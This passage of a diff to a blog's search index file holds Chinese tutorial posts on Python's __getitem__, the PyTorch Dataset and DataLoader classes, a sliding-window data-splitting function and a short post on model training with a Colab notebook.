+<li>原理:数据总线宽度决定了 CPU 一次能传送的数据位数，单位是位（bit），而 8 bit (&#x3D; 1) Byte ，直接根据数据总线宽度换算成字节（B）。</li>
 </ul>
-<h3 id="关于除了-init-方法以外的其他方法的调用"><a href="#关于除了-init-方法以外的其他方法的调用" class="headerlink" title="关于除了__init__方法以外的其他方法的调用:"></a>关于除了<code>__init__</code>方法以外的其他方法的调用:</h3><p><code>__getitem__</code> 方法在索引访问时被调用的原理</p>
-<p>Python 为了实现统一且灵活的对象操作方式，定义了一系列的特殊方法（魔术方法）。这些特殊方法允许自定义类的对象表现得像 Python 内置的数据类型（如列表、字典等）一样。</p>
-<p>当你使用 <code>obj[index]</code> 这种索引访问语法时，Python 解释器会自动查找 <code>obj</code> 对象是否实现了 <code>__getitem__</code> 方法。如果实现了，就会调用该方法并将 <code>index</code> 作为参数传递给它。这是 Python 语言的一种约定和机制，通过这种方式，你可以让自定义类支持索引访问操作。</p>
-<p>以下是一个简单的示例:</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyList</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, data</span>):</span><br><span class="line">        <span class="variable language_">self</span>.data = data</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__getitem__</span>(<span class="params">self, index</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;__getitem__ 方法被调用，索引为 <span class="subst">&#123;index&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>.data[index]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建 MyList 类的实例</span></span><br><span class="line">my_list = MyList([<span class="number">10</span>, <span class="number">20</span>, <span class="number">30</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用索引访问操作，会触发 __getitem__ 方法</span></span><br><span class="line">result = my_list[<span class="number">1</span>]</span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+]]></content>
+      <categories>
+        <category>汇编语言</category>
+      </categories>
+      <tags>
+        <tag>汇编硬件</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>滑动窗口数据清洗分区</title>
+    <url>/2025/03/18/%E6%BB%91%E5%8A%A8%E7%AA%97%E5%8F%A3%E6%95%B0%E6%8D%AE%E6%B8%85%E6%B4%97%E5%88%86%E5%8C%BA/</url>
+    <content><![CDATA[<h1 id="基本元素"><a href="#基本元素" class="headerlink" title="基本元素"></a>基本元素</h1><ul>
+<li><p>三个基本元素:</p>
+</li>
+<li><ul>
+<li>可迭代数据</li>
+<li>单个动态窗口<code>window</code>大小</li>
+<li>步长<code>step_size</code></li>
+</ul>
+</li>
+<li><p>如下代码:</p>
+</li>
+<li><pre><code class="language-python">def sliding_windows(data, window_size, step_size):#data要是可迭代数据
+    &quot;&quot;&quot;
+    步长是对窗口的移动距离
+    窗口大小是窗口的长度
+    细看以下的说明
+    &quot;&quot;&quot;
+    windows = [] #定义窗口集
+    start = 0 #动态窗口的初始值
+    while start + window_size &lt;= len(data):#窗口大小不能直接超过迭代数据大小
+        window = data[start:start+window_size]#对窗口长度进行定义
+        windows.append(window)#将窗口加入到列表中
+        start += step_size#窗口的起始位置动态变化,即动态改变窗口位置
+    return windows
 
-<p>在这个例子中，当执行 <code>my_list[1]</code> 时，Python 解释器检测到 <code>my_list</code> 对象实现了 <code>__getitem__</code> 方法，就会自动调用该方法，并将 <code>1</code> 作为参数传递给它。</p>
-<ul>
-<li>对于我们要学习的<code>Dataset</code>类,</li>
+if __name__ == &#39;__main__&#39;:
+    data = [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20]
+    print(sliding_windows(data, 5, 2))
+</code></pre>
+</li>
 </ul>
-<h3 id="关于Dataset类的基本使用流程"><a href="#关于Dataset类的基本使用流程" class="headerlink" title="关于Dataset类的基本使用流程:"></a>关于<code>Dataset</code>类的基本使用流程:</h3><h4 id="1-导入必要的库"><a href="#1-导入必要的库" class="headerlink" title="1. 导入必要的库"></a>1. 导入必要的库</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> torch.utils.data <span class="keyword">import</span> Dataset</span><br><span class="line"><span class="keyword">import</span> json</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li><code>torch.utils.data.Dataset</code>：这是 PyTorch 中用于表示数据集的抽象基类，自定义的数据集类通常需要继承这个类，以便能够使用 PyTorch 提供的数据集处理和数据加载工具。</li>
-<li><code>json</code>：Python 标准库中的 <code>json</code> 模块，用于处理 JSON 格式的数据。</li>
-</ul>
-<h4 id="2-定义自定义数据集类-AFQMC"><a href="#2-定义自定义数据集类-AFQMC" class="headerlink" title="2. 定义自定义数据集类 AFQMC"></a>2. 定义自定义数据集类 <code>AFQMC</code></h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">AFQMC</span>(<span class="title class_ inherited__">Dataset</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, data_file</span>):</span><br><span class="line">        <span class="variable language_">self</span>.data = <span class="variable language_">self</span>.load_data(data_file)</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li><code>AFQMC</code> 类继承自 <code>Dataset</code> 类。</li>
-<li><code>__init__</code> 方法是类的构造函数，在创建 <code>AFQMC</code> 类的实例时会被调用。它接收一个参数 <code>data_file</code>，表示数据文件的路径。在方法内部，调用了 <code>self.load_data(data_file)</code> 方法来加载数据，并将加载的数据存储在 <code>self.data</code> 中。</li>
-</ul>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">load_data</span>(<span class="params">self, data_file</span>):</span><br><span class="line">    Data = &#123;&#125;</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(data_file, <span class="string">&#x27;rt&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> idx, line <span class="keyword">in</span> <span class="built_in">enumerate</span>(f):</span><br><span class="line">            sample = json.loads(line.strip())</span><br><span class="line">            Data[idx] = sample</span><br><span class="line">    <span class="keyword">return</span> Data</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li><code>load_data</code> 方法是自定义的方法，用于从指定的 JSON 文件中加载数据。</li>
-<li>它首先创建一个空字典 <code>Data</code>，然后逐行读取文件。对于每一行，使用 <code>json.loads</code> 方法将其解析为 JSON 对象，并将其存储在字典 <code>Data</code> 中，键为行索引 <code>idx</code>。</li>
-<li>最后返回加载好的数据字典。</li>
-</ul>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">__len__</span>(<span class="params">self</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">len</span>(<span class="variable language_">self</span>.data)</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li><code>__len__</code> 方法是必须实现的方法，它返回数据集的长度，即数据样本的数量。在这个例子中，返回的是 <code>self.data</code> 字典的长度。</li>
-</ul>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">__getitem__</span>(<span class="params">self, idx</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">self</span>.data[idx]</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li><code>__getitem__</code> 方法也是必须实现的方法，它用于根据给定的索引 <code>idx</code> 从数据集中获取一个样本。在这个例子中，直接从 <code>self.data</code> 字典中获取对应索引的样本并返回。</li>
-</ul>
-<h4 id="3-创建数据集实例并打印样本"><a href="#3-创建数据集实例并打印样本" class="headerlink" title="3. 创建数据集实例并打印样本"></a>3. 创建数据集实例并打印样本</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">train_data = AFQMC(<span class="string">&#x27;data/afqmc_public/train.json&#x27;</span>)</span><br><span class="line">valid_data = AFQMC(<span class="string">&#x27;data/afqmc_public/dev.json&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(train_data[<span class="number">0</span>])</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>创建了两个 <code>AFQMC</code> 类的实例 <code>train_data</code> 和 <code>valid_data</code>，分别加载训练集和验证集的数据。</li>
-<li>打印训练集的第一个样本。</li>
-</ul>
-<h3 id="Dataset-在数据微调中的作用"><a href="#Dataset-在数据微调中的作用" class="headerlink" title="Dataset 在数据微调中的作用"></a><code>Dataset</code> 在数据微调中的作用</h3><p>在深度学习模型微调（fine-tuning）过程中，<code>Dataset</code> 类起着至关重要的作用：</p>
-<ul>
-<li><strong>数据组织</strong>：<code>Dataset</code> 类可以将原始数据（如文本、图像等）组织成模型可以处理的格式。通过自定义 <code>__getitem__</code> 方法，可以灵活地对数据进行预处理，如分词、编码等。</li>
-<li><strong>数据加载</strong>：<code>Dataset</code> 类可以与 <code>DataLoader</code> 类配合使用，实现数据的批量加载和并行处理。<code>DataLoader</code> 可以根据需要对数据进行打乱、分批等操作，提高数据加载的效率。</li>
-<li><strong>代码复用</strong>：自定义的 <code>Dataset</code> 类可以在不同的实验和项目中复用，方便对数据进行统一管理和处理。</li>
-</ul>
-<h3 id="Dataset-继承的方法体现"><a href="#Dataset-继承的方法体现" class="headerlink" title="Dataset 继承的方法体现"></a><code>Dataset</code> 继承的方法体现</h3><p><code>AFQMC</code> 类继承自 <code>Dataset</code> 类，虽然 <code>Dataset</code> 是一个抽象基类，没有具体的实现代码，但它定义了一些必须实现的方法，这些方法在 <code>AFQMC</code> 类中得到了具体实现：</p>
-<ul>
-<li><code>__len__</code> 方法：用于返回数据集的长度。在使用 <code>DataLoader</code> 加载数据时，<code>DataLoader</code> 会调用这个方法来确定数据集的大小。</li>
-<li><code>__getitem__</code> 方法：用于根据索引获取数据集中的一个样本。<code>DataLoader</code> 在加载数据时，会通过这个方法逐批获取数据。</li>
-</ul>
-<p>通过实现这两个方法，<code>AFQMC</code> 类就符合了 <code>Dataset</code> 类的接口规范，可以与 PyTorch 提供的其他数据处理和模型训练工具无缝集成。</p>
-<h3 id="Dataset和Dataloader类之间的配合"><a href="#Dataset和Dataloader类之间的配合" class="headerlink" title="Dataset和Dataloader类之间的配合:"></a><code>Dataset</code>和<code>Dataloader</code>类之间的配合:</h3><p><code>DataLoader</code> 是 PyTorch 中用于批量加载数据的工具，它与自定义的 <code>Dataset</code> 类（如 <code>LawDataset</code>）紧密配合，以高效地为模型训练或推理提供数据。具体的配合过程如下：</p>
-<h4 id="1-初始化阶段"><a href="#1-初始化阶段" class="headerlink" title="1. 初始化阶段"></a>1. 初始化阶段</h4><p>当你创建 <code>DataLoader</code> 实例时，需要将 <code>Dataset</code> 实例作为参数传入，例如：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> torch.utils.data <span class="keyword">import</span> DataLoader</span><br><span class="line"><span class="comment"># 假设已经定义了 LawDataset 类并创建了 dataset 实例</span></span><br><span class="line">dataloader = DataLoader(dataset, batch_size=<span class="number">2</span>, shuffle=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
-
-<p>这里的 <code>batch_size</code> 表示每个批次包含的样本数量，<code>shuffle</code> 表示是否在每个 epoch 开始时打乱数据集。</p>
-<h4 id="2-数据加载阶段"><a href="#2-数据加载阶段" class="headerlink" title="2. 数据加载阶段"></a>2. 数据加载阶段</h4><p>当你使用 <code>for</code> 循环遍历 <code>DataLoader</code> 时，<code>DataLoader</code> 会根据 <code>batch_size</code> 的设置，多次调用 <code>Dataset</code> 类的 <code>__getitem__</code> 方法来获取样本。具体步骤如下：</p>
-<ul>
-<li><code>DataLoader</code> 首先会确定当前批次需要获取的样本索引。</li>
-<li>对于每个索引，<code>DataLoader</code> 会调用 <code>Dataset</code> 实例的 <code>__getitem__</code> 方法，传入该索引，从而获取对应的样本。</li>
-<li>当获取到 <code>batch_size</code> 个样本后，<code>DataLoader</code> 会将这些样本组合成一个批次，并将其返回给循环。</li>
-</ul>
-<p>例如，当 <code>batch_size = 2</code> 时，<code>DataLoader</code> 会先调用 <code>__getitem__(0)</code> 得到第一个样本，再调用 <code>__getitem__(1)</code> 得到第二个样本，然后将这两个样本组合成一个批次。</p>
-<p><strong>补充几点:</strong></p>
-<h3 id="getitem-方法每次只处理一个文本的原因"><a href="#getitem-方法每次只处理一个文本的原因" class="headerlink" title="__getitem__ 方法每次只处理一个文本的原因"></a><code>__getitem__</code> 方法每次只处理一个文本的原因</h3><p><code>__getitem__</code> 方法设计为每次只处理一个索引对应的文本，这是为了保证代码的简洁性和灵活性。通过将数据处理逻辑封装在 <code>__getitem__</code> 方法中，<code>DataLoader</code> 可以根据需要多次调用该方法，从而实现批量数据的加载。如果 <code>__getitem__</code> 方法要处理多个文本，会增加方法的复杂度，并且不利于数据的随机访问和批量处理。</p>
-<h3 id="getitem-方法中-self-texts-idx-的调用逻辑"><a href="#getitem-方法中-self-texts-idx-的调用逻辑" class="headerlink" title="__getitem__ 方法中 self.texts[idx] 的调用逻辑"></a><code>__getitem__</code> 方法中 <code>self.texts[idx]</code> 的调用逻辑</h3><p>在 <code>__getitem__</code> 方法中，<code>self.texts[idx]</code> 只是获取 <code>self.texts</code> 列表中索引为 <code>idx</code> 的文本元素，它本身并不会触发整个 <code>__getitem__</code> 方法。<code>__getitem__</code> 方法是在 <code>DataLoader</code> 调用时被触发的，<code>DataLoader</code> 会传入一个索引 <code>idx</code>，然后执行 <code>__getitem__</code> 方法中的代码，<code>self.texts[idx]</code> 只是 <code>__getitem__</code> 方法中的一个操作步骤。</p>
-<p>以下是一个简单的示例代码，展示了 <code>DataLoader</code> 与 <code>Dataset</code> 类的配合过程：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> torch.utils.data <span class="keyword">import</span> Dataset, DataLoader</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyDataset</span>(<span class="title class_ inherited__">Dataset</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, data</span>):</span><br><span class="line">        <span class="variable language_">self</span>.data = data</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__len__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">len</span>(<span class="variable language_">self</span>.data)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__getitem__</span>(<span class="params">self, idx</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Getting item at index <span class="subst">&#123;idx&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>.data[idx]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 示例数据</span></span><br><span class="line">data = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]</span><br><span class="line">dataset = MyDataset(data)</span><br><span class="line">dataloader = DataLoader(dataset, batch_size=<span class="number">2</span>, shuffle=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> batch <span class="keyword">in</span> dataloader:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Batch: <span class="subst">&#123;batch&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
-
-<p>在这个示例中，<code>DataLoader</code> 每次会调用 <code>MyDataset</code> 的 <code>__getitem__</code> 方法两次（因为 <code>batch_size = 2</code>），获取两个样本并组合成一个批次，然后将批次返回给循环进行处理。</p>
-<p>综上所述，<code>DataLoader</code> 通过多次调用 <code>Dataset</code> 类的 <code>__getitem__</code> 方法来实现批量数据的加载，而 <code>__getitem__</code> 方法每次只处理一个索引对应的样本，保证了代码的简洁性和灵活性。</p>
 ]]></content>
       <categories>
         <category>ai</category>
       </categories>
       <tags>
-        <tag>transformer</tag>
+        <tag>数据处理</tag>
       </tags>
+  </entry>
+  <entry>
+    <title>爬虫，寻找数据集入门</title>
+    <url>/2025/03/10/%E7%88%AC%E8%99%AB%EF%BC%8C%E5%AF%BB%E6%89%BE%E6%95%B0%E6%8D%AE%E9%9B%86%E5%85%A5%E9%97%A8/</url>
+    <content><![CDATA[]]></content>
   </entry>
   <entry>
     <title>特征工程一致性与持久化</title>
@@ -2812,6 +2920,20 @@ class ContextAwareClassifier:
       </categories>
       <tags>
         <tag>ai数据流梳理</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>训练</title>
+    <url>/2025/01/22/%E8%AE%AD%E7%BB%83/</url>
+    <content><![CDATA[<h3 id="训练ai"><a href="#训练ai" class="headerlink" title="训练ai"></a>训练ai</h3><h4 id="下载资源"><a href="#下载资源" class="headerlink" title="下载资源"></a>下载资源</h4><p>1.u need to use the google colab<br>2.unsloth notebook:<a href="https://colab.research.google.com/drive/1Ys44kVvmeZtnICzWz0xgpRnrIOjZAuxp">https://colab.research.google.com/drive/1Ys44kVvmeZtnICzWz0xgpRnrIOjZAuxp</a></p>
+<h4 id="dataset"><a href="#dataset" class="headerlink" title="dataset"></a>dataset</h4><img src="/2025/01/22/%E8%AE%AD%E7%BB%83/image-20250122153200433.png" class="" title="image-20250122153200433">
+
+<h4 id="unsloth"><a href="#unsloth" class="headerlink" title="unsloth"></a>unsloth</h4><h4 id="weight"><a href="#weight" class="headerlink" title="weight"></a>weight</h4><h4 id="dataset-processing"><a href="#dataset-processing" class="headerlink" title="dataset processing"></a>dataset processing</h4><h4 id="huggface"><a href="#huggface" class="headerlink" title="huggface"></a>huggface</h4>]]></content>
+      <categories>
+        <category>ai</category>
+      </categories>
+      <tags>
+        <tag>ai训练</tag>
       </tags>
   </entry>
   <entry>
@@ -3082,20 +3204,6 @@ class ContextAwareClassifier:
       </categories>
       <tags>
         <tag>transformer模型入门</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>训练</title>
-    <url>/2025/01/22/%E8%AE%AD%E7%BB%83/</url>
-    <content><![CDATA[<h3 id="训练ai"><a href="#训练ai" class="headerlink" title="训练ai"></a>训练ai</h3><h4 id="下载资源"><a href="#下载资源" class="headerlink" title="下载资源"></a>下载资源</h4><p>1.u need to use the google colab<br>2.unsloth notebook:<a href="https://colab.research.google.com/drive/1Ys44kVvmeZtnICzWz0xgpRnrIOjZAuxp">https://colab.research.google.com/drive/1Ys44kVvmeZtnICzWz0xgpRnrIOjZAuxp</a></p>
-<h4 id="dataset"><a href="#dataset" class="headerlink" title="dataset"></a>dataset</h4><img src="/2025/01/22/%E8%AE%AD%E7%BB%83/image-20250122153200433.png" class="" title="image-20250122153200433">
-
-<h4 id="unsloth"><a href="#unsloth" class="headerlink" title="unsloth"></a>unsloth</h4><h4 id="weight"><a href="#weight" class="headerlink" title="weight"></a>weight</h4><h4 id="dataset-processing"><a href="#dataset-processing" class="headerlink" title="dataset processing"></a>dataset processing</h4><h4 id="huggface"><a href="#huggface" class="headerlink" title="huggface"></a>huggface</h4>]]></content>
-      <categories>
-        <category>ai</category>
-      </categories>
-      <tags>
-        <tag>ai训练</tag>
       </tags>
   </entry>
 </search>
